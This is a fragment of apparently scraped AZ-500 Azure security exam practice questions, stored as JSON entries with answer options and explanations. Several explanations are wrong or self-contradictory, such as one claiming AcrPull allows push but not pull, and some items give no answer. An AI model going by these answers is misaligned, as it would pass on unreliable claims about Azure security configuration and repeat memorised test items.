37","text":"<p>You have an Azure Storage account. You plan to prevent the use of shared keys by using Azure Policy. Which two access methods will continue to work? Each correct answer presents a complete solution.</p> <ul> <li> Storage Blob Data Reader role</li> <li> service SAS</li> <li> user delegation</li> <li> account SAS</li> </ul> See response <p>The Storage Blob Data Reader role uses Azure AD to authenticate. User delegation SAS is a method that uses Azure AD to generate a SAS. Both methods work whether the shared keys are allowed or prevented. Service SAS and account SAS use shared keys to generate.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-38","title":"Question 38","text":"<p>You enable Always Encrypted for an Azure SQL database. Which scenario is supported?</p> <ul> <li> encrypting existing data</li> </ul> See response <p>Encrypting existing data is supported. Always Encrypted uses the client driver to encrypt and decrypt data. This means that some actions that only occur on the server side will not work.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-39","title":"Question 39","text":"<p>You are evaluating the Azure Policy configurations to identify any required custom initiatives and policies. You need to run workloads in Azure that are compliant with the following regulations:</p> <ul> <li>FedRAMP High</li> <li>PCI DSS 3.2.1</li> <li>GDPR</li> <li>ISO 27001:2013</li> </ul> <p>For which regulation should you create custom initiatives?</p> <ul> <li> FedRAMP High</li> <li> PCI DSS 3.2.1</li> <li> GDPR</li> <li> ISO 27001:2013</li> </ul> See response <p>To run workloads that are compliant with GDPR, custom initiatives should be to be created. GDPR compliance initiatives are not yet available in Azure. Azure has existing initiatives for ISO, PCI DSS 3.2.1, and FedRAMP High.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-40","title":"Question 40","text":"<p>You have a workload in Azure that uses multiple virtual machines and Azure functions to access data in a storage account.  You need to ensure that all access to the storage account is done by using a single identity. The solution must reduce the overhead of managing the identity. Which type of identity should you use? Select only one answer.</p> <ul> <li> group</li> <li> system-assigned managed identity</li> <li> user</li> <li> user-assigned managed identity</li> </ul> See response <p>A user assigned managed identity can be shared across Azure resources, and its password changes are handled by Azure. An user needs to manually handle password changes. You cannot use a group as a service principle. Multiple Azure resources cannot share system-assigned managed identities.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-41","title":"Question 41","text":"<p>You have a workload in Azure that uses a virtual machine named VM1. VM1 is in a resource group named RG1. You need to create and assign an identity to VM1 that will be used to access Azure resources. Other virtual machines must be able to use the same identity. Which PowerShell script should you run? Select only one answer.</p> <ul> <li> <code>New-AzUserAssignedIdentity -ResourceGroupName RG1 -Name VMID $vm = Get-AzVM -ResourceGroupName RG1 -Name VM1 Update-AzVM -ResourceGroupName RG1 -VM $vm -IdentityType UserAssigned -IdentityID \"/subscriptions/&lt;SUBSCRIPTION ID&gt;/resourcegroups/RG1/providers/Microsoft.ManagedIdentity/userAssignedIdentities/VM1\"</code></li> <li> <code>New-AzUserAssignedIdentity -ResourceGroupName RG1 -Name VMID $vm = Get-AzVM -ResourceGroupName RG1 -Name VM1 Update-AzVM -ResourceGroupName RG1 -VM $vm -IdentityType UserAssigned -IdentityID \"/subscriptions/&lt;SUBSCRIPTION ID&gt;/resourcegroups/RG1/providers/Microsoft.ManagedIdentity/userAssignedIdentities/VMID\"</code></li> <li> <code>$vm = Get-AzVM -ResourceGroupName RG1 -Name VM1 Update-AzVM -ResourceGroupName RG1 -VM $vm -IdentityType SystemAssigned</code></li> <li> <code>$vm = Get-AzVM -ResourceGroupName RG1 -Name VM1 Update-AzVM -ResourceGroupName RG1 -VM $vm -IdentityType SystemAssignedUserAssigned</code></li> </ul> See response <p><code>New-AzUserAssignedIdentity -ResourceGroupName RG1 -Name VMID $vm = Get-AzVM -ResourceGroupName RG1 -Name VM1 Update-AzVM -ResourceGroupName RG1 -VM $vm -IdentityType UserAssigned -IdentityID \"/subscriptions/&lt;SUBSCRIPTION ID&gt;/resourcegroups/RG1/providers/Microsoft.ManagedIdentity/userAssignedIdentities/VMID\"</code></p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-42","title":"Question  42","text":"<p>You have an Azure subscription that contains an Azure Kubernetes Service (AKS) cluster named AKS1 and a user named User1. You need to ensure that User1 has access to AKS1 secrets. The solution must follow the principle of least privilege. Which role should you assign to User1? Select only one answer.</p> <ul> <li> Azure Kubernetes Service RBAC Admin</li> <li> Azure Kubernetes Service RBAC Cluster Admin</li> <li> Azure Kubernetes Service RBAC Reader</li> <li> Azure Kubernetes Service RBAC Writer</li> </ul> See response <p>Azure Kubernetes Service RBAC Writer has access to secrets. Azure Kubernetes Service RBAC Reader does not have access to secrets. Azure Kubernetes Service RBAC Cluster Admin and Azure Kubernetes Service RBAC Admin do not follow the principle of least privilege.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-43","title":"Question  43","text":"<p>You have an Azure subscription that contains an Azure container registry named CR1. You use Azure CLI to authenticate to the subscription. You need to authenticate to CR1 by using Azure CLI. Which command should you run? Select only one answer.</p> <ul> <li> <code>az acr config</code></li> <li> <code>az acr credential</code></li> <li> <code>az acr login</code></li> <li> <code>docker login</code></li> </ul> See response <p>The\u00a0<code>az acr login</code>\u00a0command is needed to authenticate to an Azure container registry from the Azure CLI. Docker login is used to sign in to a Docker repository.\u00a0<code>az acr config</code>\u00a0is used for configuring Azure Container Registry.\u00a0<code>az acr credential</code>\u00a0is used for managing login credentials for Azure Container Registry.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-44","title":"Question 44","text":"<p>You have an Azure AD tenant that syncs with the on-premises Active Directory Domain Service (AD DS) domain and uses Azure Active Directory Domain Services (Azure AD DS). You have an application that runs on user devices by using the credentials of the signed-in user The application accesses data in Azure Files by using REST calls. You need to configure authentication for the application in Azure Files by using the most secure authentication method. Which authentication method should you use? Select only one answer.</p> <ul> <li> Azure AD</li> <li> SAS</li> <li> shared key</li> <li> on-premises Active Directory Domain Service (AD DS)</li> </ul> See response <p>A SAS is the most secure way to access Azure Files by using REST calls. A shared key allows any user with the key to access data. Azure AD and Active Directory Domain Service (AD DS) are unsupported for REST calls.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-45","title":"Question 45","text":"<p>You have an Azure SQL Database server. You enable Azure AD authentication for Azure SQL. You need to prevent other authentication methods from being used. Which command should you run? Select only one answer.</p> <ul> <li> <code>az sql mi ad-admin create</code></li> <li> <code>az sql mi ad-only-auth enable</code></li> <li> <code>az sql server ad-admin create</code></li> <li> <code>az sql server ad-only-auth enable</code></li> </ul> See response <p><code>az sql server ad-only-auth enable</code></p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-46","title":"Question 46","text":"<p>**You are configuring an Azure Policy in your environment. You need to ensure that any resources that are missing a tag named CostCenter inherit a value from a resource group. You create a custom policy that uses the following snippet. **</p> <pre><code>\"policyRule\": {\n    \"if\": {\n        \"field\": \"tags['CostCenter']\",\n        \"exists\": \"false\"\n    },\n    \"then\": {\n        \"effect\": \"modify\",\n        \"details\": {\n            \"roleDefinitionIds\": [\n                \"/providers/microsoft.authorization/roleDefinitions/b24988ac-6180-42a0-ab88-20f7382dd24c\"\n            ],\n            \"operations\": [{\n                \"operation\": \"addOrReplace \",\n                \"field\": \"tags['CostCenter']\",\n                \"value\": \"[resourcegroup().tags['CostCenter']]\"\n            }]\n        }\n    }\n}\n</code></pre> <p>Which policy mode should you use? Select only one answer.</p> <ul> <li> <code>all</code></li> <li> <code>Append</code></li> <li> <code>DeployIfNotExists</code></li> <li> <code>indexed</code></li> </ul> See response <p>Indexed.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-47","title":"Question 47","text":"<p>You set Periodic recurring scans to\u00a0ON\u00a0while implementing a Microsoft Defender for SQL vulnerability assessment. How often will the scan be triggered? Select only one answer.</p> <ul> <li> at a recurrence that you configure</li> <li> once a day</li> <li> once a month</li> <li> once a week</li> </ul> See response <p>Once a week.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-48","title":"Question 48","text":"<p>You are implementing Microsoft Defender for SQL vulnerability assessments. In which two locations can users view the results? Each correct answer presents a complete solution. Select all answers that apply.</p> <ul> <li> an Azure Blob storage account</li> <li> an Azure Event Grid instance</li> <li> Microsoft Defender for Cloud</li> <li> Microsoft Teams</li> </ul> See response <p>Defender for Cloud is the default and mandatory location to view the results, while a Blob storage account is a mandatory destination and a prerequisite for enabling the scan. The Teams option is unavailable out of the box. A scan completion event is not sent to Event Grid.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-49","title":"Question 49","text":"<p>You are collecting Azure activity logs to Azure Monitor. The retention period for Azure Monitor logs is set to 30 days. To meet compliance requirements, you need to send a copy of the Azure activity logs to your SOC partner. What should you do? Select only one answer.</p> <ul> <li> Configure a workspace retention policy.</li> <li> Configure diagnostic settings and send the logs to Azure Event Hubs.</li> <li> Configure diagnostic settings and send the logs to Azure Storage.</li> <li> Install the Microsoft Sentinel security information and event management (SIEM) connector.</li> </ul>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-50","title":"Question 50","text":"<p>You are designing an Azure solution that stores encrypted data in Azure Storage. You need to ensure that the keys used to encrypt the data cannot be permanently deleted until 60 days after they are deleted. The solution must minimize costs. What should you do?  Select only one answer.</p> <ul> <li> Store keys in an HSM-protected key vault that has soft delete and purge protection enabled.</li> <li> Store keys in an HSM-protected key vault that has soft delete enabled.</li> <li> Store keys in a software-protected key vault that has soft delete and purge protection enabled.</li> <li> Store keys in a software-protected key vault that has soft delete enabled and purge protection disabled.</li> </ul> See response <p>Store keys in a software-protected key vault that has soft delete and purge protection enabled.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-51","title":"Question 51","text":"<p>You plan to provide connectivity between Azure and your company\u2019s datacenter. You need to define how to establish the connection. The solution must meet the following requirements:</p> <ul> <li>All traffic between the datacenter and Azure must be encrypted.</li> <li>Bandwidth must be between 10 and 100 Gbps.</li> </ul> <p>What should you use for the connection? Select only one answer.</p> <ul> <li> Azure VPN Gateway</li> <li> ExpressRoute Direct</li> <li> ExpressRoute with a provider</li> <li> VPN Gateway with Azure Virtual WAN</li> </ul> See response <p>ExpressRoute Direct</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-52","title":"Question  52","text":"<p>You are operating in a cloud-only environment. Users have computers that run either Windows 10 or 11. The users are located across the globe. You need to secure access to a point-to-site (P2S) VPN by using multi-factor authentication (MFA). Which authentication method should you implement? Select only one answer.</p> <ul> <li> Authenticate by using Active Directory Domain Services (AD DS).</li> <li> Authenticate by using native Azure AD authentication.</li> <li> Authenticate by using native Azure certificate-based authentication.</li> <li> Authenticate by using RADIUS.</li> </ul>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-53","title":"Question  53","text":"<p>You have an Azure subscription that contains the following resources:</p> <ul> <li>Two virtual networks<ul> <li>VNet1: Contains two subnets</li> <li>VNet2: Contains three subnets</li> </ul> </li> <li>Virtual machines: Connected to all the subnets on VNet1 and VNet2</li> <li>A storage account named storage1</li> </ul> <p>You need to identify the minimal number of service endpoints that are required to meet the following requirements:</p> <ul> <li>Virtual machines that are connected to the subnets of VNet1 must be able to access storage1 over the Azure backbone.</li> <li>Virtual machines that are connected to the subnets of VNet2 must be able to access Azure AD over the Azure backbone.</li> </ul> <p>**How many service endpoints should you recommend? Select only one answer. **</p> <ul> <li> 2</li> <li> 3</li> <li> 4</li> <li> 5</li> </ul> See response <p>A service endpoint is configured for a specific server at the subnet level. Based on the requirements, you need to configure two service endpoints for\u00a0<code>Microsoft.Storage</code>\u00a0on VNet1 because VNet1 has two subnets and three service endpoints for\u00a0<code>Microsoft.AzureActiveDirectory</code>\u00a0on VNet2 because VNet2 has three subnets. The minimum number of service endpoints that you must configure is five.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-54","title":"Question 54","text":"<p>You have an Azure subscription that contains a virtual network named VNet1. VNet1 contains the following subnets:</p> <ul> <li>Subnet1: Has a connected virtual machine</li> <li>Subnet2: Has a\u00a0<code>Microsoft.Storage</code>\u00a0service endpoint</li> <li>Subnet3: Has subnet delegation to the\u00a0<code>Microsoft.Web/serverFarms</code>\u00a0service</li> <li>Subnet: Has no additional configurations</li> </ul> <p>You need to deploy an Azure SQL managed instance named managed1 to VNet1. To which subnets can you connect managed1? Select only one answer.</p> <ul> <li> Subnet4 only</li> <li> Subnet3 and Subnet4 only</li> <li> Subnet2 and Subnet4 only</li> <li> Subnet2, Subnet3, and Subnet4 only</li> <li> Subnet1, Subnet2, Subnet3, and Subnet4</li> </ul> See response <p>You can deploy an SQL managed instance to a dedicated virtual network subnet that does not have any resource connected. The subnet can have a service endpoint or can be delegated for a different service. For this scenario, you can deploy managed1 to Subnet2, Subnet3, and Subnet4 only. You cannot deploy managed1 to Subnet1 because Subnet1 has a connected virtual machine.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-55","title":"Question 55","text":"<p>You use Azure Blueprints to deploy resources to a resource group named RG1. After the deployment, you try to add a disk to a virtual machine created by using Blueprints, but you get an access denied error. You open\u00a0RG1\u00a0and check your access. You notice that you are listed as part of the Virtual Machine Contributor role for RG1, and there are no deny assignments or classic administrators in the resource group scope. Why are you unable to manage the virtual machine? Select only one answer.</p> <ul> <li> Blueprints created a deny assignment for the virtual machine resource.</li> <li> Blueprints removed the user from the Classic Administrator role.</li> <li> You must be part of the Disk Pool Operator role.</li> <li> You must be part of the Virtual Machine Administrator Login role.</li> </ul> See response <p>Blueprints must have created a deny assignment at the resource level. The Disk Pool Operator role allows users to provide permissions to the StoragePool resource provider, and the Virtual Machine Administrator Login role allows users to view the virtual machine in the portal and sign in as an administrator. You still have the Contributor role and should be able to manage a virtual machine unless a deny assignment is in place.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-56","title":"Question 56","text":"<p>You create an Azure policy by using the following snippet.</p> <pre><code>\"then\": {\n    \"effect\": \"\",\n    \"details\": [{\n        \"field\": \"Microsoft.Storage/storageAccounts/networkAcls.ipRules\",\n        \"value\": [{\n            \"action\": \"Allow\",\n            \"value\": \"134.5.0.0/21\"\n        }]\n    }]\n}\n</code></pre> <p>You need to ensure that the policy is applied whenever a new storage account is created or updated. There is no managed identity assigned to the policy initiative. Which effect should you use? Select only one answer.</p> <ul> <li> <code>Append</code></li> <li> <code>Audit</code></li> <li> <code>DeployIfNotExists</code></li> <li> <code>Modify</code></li> </ul> See response <p><code>Append</code>\u00a0is used to add fields to existing properties.\u00a0<code>Modify</code>\u00a0is used to add, update, or remove properties, it does not ensure that a field has value.\u00a0<code>DeployIfNotExists</code>\u00a0is used to deploy resources.\u00a0<code>Audit</code>\u00a0is used to check for compliance.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-57","title":"Question 57","text":"<p>You have an Azure subscription. You need to recommend a solution that uses crawling technology of Microsoft to discover and actively scan assets within an online infrastructure. The solution must also discover new connections over time. What should you include in the recommendation? Select only one answer.</p> <ul> <li> a Microsoft Defender for Cloud custom initiative</li> <li> Microsoft Defender External Attack Surface Management (EASM)</li> <li> Microsoft Defender for Servers</li> <li> the Microsoft cloud security benchmark (MCSB)</li> </ul> See response <p>Defender EASM applies the crawling technology of Microsoft to discover assets that are related to your known online infrastructure and actively scans these assets to discover new connections over time. Attack Surface Insights are generated by applying vulnerability and infrastructure data to showcase the key areas of concern for your organization.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-58","title":"Question 58","text":"<p>You have an Azure subscription and the following SQL deployments:</p> <ul> <li>An Azure SQL database named DB1</li> <li>An Azure SQL Server named sqlserver1</li> <li>An instance of SQL Server on Azure Virtual Machines named VM1 that has Microsoft SQL Server 2022 installed</li> <li>An on-premises server named Server1 that has SQL Server 2019 installed</li> </ul> <p>Which deployments can be protected by using Microsoft Defender for Cloud? Select only one answer.</p> <ul> <li> DB1 and sqlserver1 only</li> <li> DB1, sqlserver1, and VM1 only</li> <li> DB1, sqlserver1, VM1, and Server1</li> <li> sqlserver1 only</li> <li> sqlserver1 and VM1 only</li> </ul> See response <p>Defender for Cloud includes Microsoft Defender for SQL. Defender for SQL can protect Azure SQL Database, Azure SQL Server, SQL Server on Azure Virtual Machines, and SQL servers installed on on-premises servers.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-59","title":"Question 59","text":"<p>You are designing a solution that must meet FIPS 140-2 Level 3 compliance in Azure. Where should the solution maintain encryption keys? Select only one answer.</p> <ul> <li> a managed HSM</li> <li> a software-protected Azure key vault</li> <li> an Azure SQL Manage Instance database</li> <li> an HSM-protected Azure key vault</li> </ul> See response <p>A managed HSM is level 3-compliant. An HSM-protected key vault is level 2-compliant. A software-protected key vault is level 1-complaint. SQL is not FIPS 104-2 level 3 compliant.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-60","title":"Question 60","text":"<p>You have an Azure tenant that contains a user named User1 and an Azure key vault named Vault1. Vault1 is configured to use Azure role-based access control (RBAC). You need to ensure that User1 can perform actions on keys in Vault1 but cannot manage permissions. The solution must follow the principle of least privilege. Which role should you assign to User1? Select only one answer.</p> <ul> <li> Key Vault Crypto Officer</li> <li> Key Vault Crypto User</li> <li> Key Vault Reader</li> <li> Key Vault Secrets Officer</li> <li> Key Vault Secrets User</li> </ul> See response <p>Correct: Key Vault Crypto Officer \u2013\u2013 This role meets the requirements.  Incorrect: Key Vault Secrets Officer \u2013\u2013 This role is for secrets, not keys. Incorrect: Key Vault Reader \u2013\u2013 This role is only for read access, not performing actions. Incorrect: Key Vault Crypto User \u2013\u2013 This role can manage permissions. Incorrect: Key Vault Secrets User \u2013\u2013 This role is for secrets, not keys.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-61","title":"Question 61","text":"<p>You are implementing an Azure Kubernetes Service (AKS) cluster for a production workload. You need to ensure that the cluster meets the following requirements:</p> <ul> <li>Provides the highest networking performance possible</li> <li>Manages ingress traffic by using Kubernetes tools</li> </ul> <p>What should you use? Select only one answer.</p> <ul> <li> CNI networking with Azure load balancers</li> <li> CNI networking with ingress resources and controllers</li> <li> Kubenet networking with Azure load balancers</li> <li> Kubenet networking with ingress resources and controllers</li> </ul> See response <p>CNI networking provides the best performance since it does not require IP forwarding and UDR, and ingress controllers can be managed from within Kuberbetes. Kubenet networking requires defined routes and IP forwarding, making the network slower. Azure load balancers cannot be managed by using Kubernetes tools.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-62","title":"Question 62","text":"<p>You have an Azure subscription that contains a virtual machine named VM1. VM1 is configured with just-in-time (JIT) VM access. You need to request access to VM1.  Which PowerShell cmdlet should you run? Select only one answer.</p> <ul> <li> <code>Add-AzNetworkSecurityRuleConfig</code></li> <li> <code>Get-AzJitNetworkAccessPolicy</code></li> <li> <code>Set-AzJitNetworkAccessPolicy</code></li> <li> <code>Start-AzJitNetworkAccessPolicy</code></li> </ul> See response <p>The\u00a0<code>start-AzJitNetworkAccesspolicy</code>\u00a0PowerShell cmdlet is used to request access to a JIT-enabled virtual machine.\u00a0<code>Set-AzJitNetworkAccessPolicy</code>\u00a0is used to enable JIT on a virtual machine.\u00a0<code>Get-AzJitNetworkAccessPolicy</code>\u00a0and\u00a0<code>Add-AzNetworkSecurityRuleConfig</code>\u00a0are not used to start a request access.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-63","title":"Question 63","text":"<p>You create a role by using the following JSON.</p> <pre><code>{\n  \"Name\": \"Virtual Machine Operator\",\n  \"Id\": \"88888888-8888-8888-8888-888888888888\",\n  \"IsCustom\": true,\n  \"Description\": \"Can monitor and restart virtual machines.\",\n  \"Actions\": [\n    \"Microsoft.Storage/*/read\",\n    \"Microsoft.Network/*/read\",\n    \"Microsoft.Compute/virtualMachines/start/action\",\n    \"Microsoft.Compute/virtualMachines/restart/action\",\n    \"Microsoft.Authorization/*/read\",\n    \"Microsoft.ResourceHealth/availabilityStatuses/read\",\n    \"Microsoft.Resources/subscriptions/resourceGroups/read\",\n    \"Microsoft.Insights/alertRules/*\",\n    \"Microsoft.Insights/diagnosticSettings/*\",\n    \"Microsoft.Support/*\"\n  ],\n  \"NotActions\": [],\n  \"DataActions\": [],\n  \"NotDataActions\": [],\n  \"AssignableScopes\": [\"/subscriptions/*\"]\n}\n</code></pre> <p>A user that is part of the new role reports that they are unable to restart a virtual machine by using a PowerShell script. What should you do to ensure that the user can restart the virtual machine?</p> <ul> <li> Add\u00a0<code>Microsoft.Compute/virtualMachines/login/action</code>\u00a0to the list of\u00a0<code>DataActions</code>\u00a0in the custom role.</li> <li> Add\u00a0<code>Microsoft.Compute/*/read</code>\u00a0to the list of\u00a0<code>Actions</code>\u00a0in the role.</li> </ul> See response <p>The role needs read access to virtual machines to restart them. The user does not need to authenticate again for the role to be in effect, and the user will not be able to access the virtual machine from the portal. Adding\u00a0<code>Microsoft.Compute/virtualMachines/login/action</code>\u00a0to the list of\u00a0<code>DataActions</code>\u00a0in the role allows the user to sign in as a user, but not to restart the virtual machine.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-64","title":"Question 64","text":"<p>You have a Linux virtual machine in an on-premises datacenter that is used as a forwarder for Microsoft Sentinel by using CEF-formatted logs. The timestamp on events retrieved from the forwarder is the time the agent on the forwarder received the event, not the time the event occurred on the system it came from. You need to ensure that Microsoft Sentinel receives the time the event was generated. What should you do? Select only one answer.</p> <ul> <li> Run\u00a0<code>cef_gather_info.py</code>\u00a0on CEF forwarder.</li> <li> Run\u00a0<code>cef_gather_info.py</code>\u00a0on each system that sends events to the forwarder.</li> <li> Run\u00a0<code>TimeGenerated.py</code>\u00a0on each system that sends events to the forwarder.</li> <li> Run\u00a0<code>TimeGenerated.py</code>\u00a0on the CEF forwarder.</li> </ul> See response <p>Running\u00a0<code>TimeGenerated.py</code>\u00a0on the CEF forwarder changes the logging on the forwarder to the use the event time instead of the time the event was received by the agent on the forwarder. Running\u00a0<code>TimeGenerated.py</code>\u00a0on each system will not change the way events are logged on the forwarder. Running\u00a0<code>cef_gather_info.py</code>\u00a0gathers data, but it does not change the timestamp.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-65","title":"Question 65","text":"<p>You configure a Linux virtual machine to send Syslog data to Microsoft Sentinel. You notice that events for the virtual machine are duplicated in Microsoft Sentinel. You need to ensure that the events are not duplicated.  Which two actions should you perform? Each correct answer presents part of the solution. Select all answers that apply.</p> <ul> <li> Disable the synchronization of the Log Analytics agent with the Syslog configuration in Microsoft Sentinel.</li> <li> Disable the Syslog daemon from listening to network messages.</li> <li> Enable the Syslog daemon to listen to network messages.</li> <li> Remove the entry used to send CEF messages from the Syslog configuration file for the virtual machine.</li> <li> Stop the Syslog daemon on the virtual machine.</li> </ul> See response <p>You must disable CEF messages on the virtual machine and prevent the setting to send CEF messages from being read. Stopping the Syslog daemon on the virtual machine will stop the virtual machine from sending both Syslog and CEF messages. Enabling the Syslog daemon to listen and disabling the Syslog daemon from listening to network messages does not handle the duplication of events.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-66","title":"Question 66","text":"<p>You are configuring automatic key rotation for an encryption key stored in Azure Key Vault. You need to implement an alert to be triggered five days before the keys are rotated. What should you use? Select only one answer.</p> <ul> <li> an action group alert</li> <li> Application Insights</li> <li> Azure Event Grid</li> <li> Microsoft Defender for Key Vault</li> </ul> See response <p>Using Event Grid triggers the\u00a0<code>Microsoft.KeyVault.CertificateNearExpiry</code>\u00a0event. Key Vault cannot be monitored by using Application Insights. Defender for Key Vault is used to alert for unusual and unplanned activities. Key Vault key expiration cannot be monitored by using action group alerts.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-67","title":"Question 67","text":"<p>You have an Azure subscription that contains an Azure container registry named ACR1 and a user named User1. You need to ensure that User1 can administer images in ACR1. The solution must follow the principle of least privilege. Which two roles should you assign to User1? Each correct answer presents part of the solution. Select all answers that apply.</p> <ul> <li> AcrDelete</li> <li> AcrImageSigner</li> <li> AcrPull</li> <li> AcrPush</li> <li> Contributor</li> <li> Reader</li> </ul> See response <p>To administer images in ACR1, a user must be able to push and pull images to ACR1 and delete images from ACR1. The AcrPush and AcrDelete roles are required to push, pull, and delete images in ACR1. AcrPull only allows the Push image permission, not pull. Contributor can also perform these operations, however it also has many additional permissions, which means that it does not follow the principle of least privilege. Reader and AcrImageSigner do not have adequate permissions.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-68","title":"Question 68","text":"<p>You need to allow only Azure AD-authenticated principals to access an existing Azure SQL database. Which three actions should you perform? Each correct answer presents part of the solution. Select all answers that apply.</p> <ul> <li> Add an Azure AD administrator.</li> <li> Assign your account the SQL Security Manager built-in role.</li> <li> Connect to the database by using Microsoft SQL Server Management Studio (SSMS).</li> <li> Connect to the database by using the Azure portal.</li> <li> Select\u00a0Support only Azure Active Directory authentication for this server.</li> </ul> See response <p>Adding an Azure AD administrator and assigning your account the SQL Security Manager built-in role are prerequisites for enabling Azure AD-only authentication. Selecting Support only Azure AD authentication for this server enforces the Azure SQL logical server to use Azure AD authentication. A connection to the data plane of the logical server is not needed.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-69","title":"Question  69","text":"<p>You manage Azure AD for a retail company. You need to ensure that employees using shared Android tablets can use passwordless authentication when accessing the Azure portal. Which authentication method should you use? Select only one answer.</p> <ul> <li> the Microsoft Authenticator app</li> <li> security keys</li> <li> Windows Hello</li> <li> Windows Hello for Business</li> </ul> See response <p>You can only use the Microsoft Authenticator app or one-time password login on shared devices. Windows Hello can only be used for Windows devices. You cannot use security keys on shared devices.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-70","title":"Question 70","text":"<p>You need to configure passwordless authentication. The solution must follow the principle of least privilege. Which role should assign to complete the task? Select only one answer.</p> <ul> <li> Authentication Administrator</li> <li> Authentication Policy Administrator</li> <li> Global Administrator</li> <li> Security Administrator</li> </ul> See response <p>Configuring authentication methods requires Global Administrator privileges. Security administrators have permissions to manage other security-related features. Authentication policy administrators can configure the authentication methods policy, tenant-wide multi-factor authentication (MFA) settings, and password protection policy. Authentication administrators can set or reset any authentication methods, including passwords, for non-administrators and some roles.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-71","title":"Question 71","text":"<p>You manage Azure AD. You disable the Users can register applications option in Azure AD. A user reports that they are unable to register an application. You need to ensure that that the user can register applications. The solution must follow the principle of least privilege. What should you do? Select only one answer.</p> <ul> <li> Assign the Application Developer role to the user.</li> <li> Assign the Authentication Administrator role to the user.</li> <li> Assign the Cloud App Security Administrator role to the user.</li> <li> Enable the Users can register applications option.</li> </ul> See response <p>The Application Developer role has permissions to register an application even if the Users can register applications option is disabled. The Users can register applications option allows any user to register an application. The Authentication Administrator role and the Cloud App Security Administrator role do not follow the principle of least privilege.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-72","title":"Question 72","text":"<p>You have a virtual network that contains an Azure Kubernetes Service (AKS) workload and an internal load balancer. Multiple virtual networks are managed by multiple teams. You are unable to change any of the IP addresses. You need to ensure that clients from virtual networks in your Azure subscription can access the AKS cluster by using the internal load balancer. What should you do? Select only one answer.</p> <ul> <li> Create a private link endpoint on the virtual network and instruct users to access the cluster by using a private link endpoint on their virtual network.</li> <li> Create a private link service on the virtual network and instruct users to access the cluster by using a private link endpoint in their virtual networks.</li> <li> Create virtual network peering between the virtual networks to allow connectivity.</li> <li> Create VPN site-to-site (S2S) connections between the virtual networks to allow connectivity.</li> </ul> See response <p>A private link service will allow access from outside the virtual network to an endpoint by using NAT. Since you do not control the IP addressing for other virtual networks, this ensures connectivity even if IP addresses overlap. Once a private link service is used in the load balancer, other users can create a private endpoint on virtual networks to access the load balancer.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-73","title":"Question 73","text":"<p>You have an Azure subscription that contains a virtual machine named VM1. VM1 runs a web app named App1. You need to protect App1 by implementing Web Application Firewall (WAF). What resource should you deploy? Select only one answer.</p> <ul> <li> Azure Application Gateway</li> <li> Azure Firewall</li> <li> Azure Front Door</li> <li> Azure Traffic Manager</li> </ul> See response <p>WAF is a tier of Application Gateway. If you want to deploy WAF, you must deploy Application Gateway and select the WAF or WAF V2 tier.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-74","title":"Question 74","text":"<p>You have an Azure AD tenant that uses the default setting. You need to prevent users from a domain named contoso.com from being invited to the tenant. What should you do? Select only one answer.</p> <ul> <li> Deploy Azure AD Privileged Identity Management (PIM).</li> <li> Edit the Access review settings.</li> <li> Edit the Collaboration restrictions settings.</li> <li> Enable security defaults.</li> </ul> See response <p>After you edit the Collaboration restrictions settings, if you 